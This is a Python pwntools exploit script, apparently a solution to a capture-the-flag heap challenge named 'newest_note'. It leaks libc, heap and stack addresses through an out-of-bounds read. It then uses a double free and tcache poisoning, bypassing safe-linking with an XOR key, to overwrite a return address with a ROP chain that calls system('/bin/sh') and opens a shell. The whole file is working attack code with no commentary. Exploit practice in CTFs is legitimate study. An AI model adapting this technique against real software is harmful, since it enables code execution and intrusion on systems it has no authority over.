from pwn import *


p = process('./newest_note')
# p = remote('node4.anna.nssctf.cn', 28602)
lib = ELF('./libs_/libc.so.6')


def choice(id_):
    p.recvuntil(b':')
    p.sendline(id_)


def add(id_, mess):
    choice(b'1')
    p.recvuntil(b':')
    p.sendline(id_)
    p.recvuntil(b':')
    p.send(mess)


def delete(id_):
    choice(b'2')
    p.recvuntil(b':')
    p.sendline(id_)


def show(id_):
    choice(b'3')
    p.recvuntil(b':')
    p.sendline(id_)


p.recvuntil(b':')
p.sendline(str(int(0x40100000)).encode())
chunk_id = 0x100200 + 0x218ce0 / 8 - 2
show(str(int(chunk_id)).encode())
p.recvuntil(b' Content: ')
base_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\00')) - 0x218cc0
print(hex(base_addr))

chunk_id = 0x100200 + 0x218cd0 / 8 - 2
show(str(int(chunk_id)).encode())
p.recvuntil(b' Content: ')
heap_addr = u64(p.recvuntil(b'\n')[: -1].ljust(8, b'\00'))
key = heap_addr >> 12
print(hex(key))

chunk_id = 0x100200 + 0x217FB8 / 8 - 2
show(str(int(chunk_id)).encode())
p.recvuntil(b' Content: ')
stack_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\00'))
print(hex(stack_addr))

return_addr = stack_addr - (0x3688 - 0x3550)
pop_rdi = base_addr + 0x000000000002e6c5
ret_addr = base_addr + 0x000000000002d9b9
system_addr = base_addr + lib.sym['system']
bin_sh_addr = base_addr + next(lib.search(b'/bin/sh'))

[add(str(i).encode(), b'a') for i in range(10)]
[delete(str(i).encode()) for i in range(9)]
delete(b'7')
[add(str(i).encode(), b'a') for i in range(7)]
add(b'10', p64(return_addr ^ key))
add(b'11', b'a')
add(b'12', b'a')
payload = p64(0) + p64(ret_addr) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)
add(b'13', payload)
choice(b'4')
p.interactive()
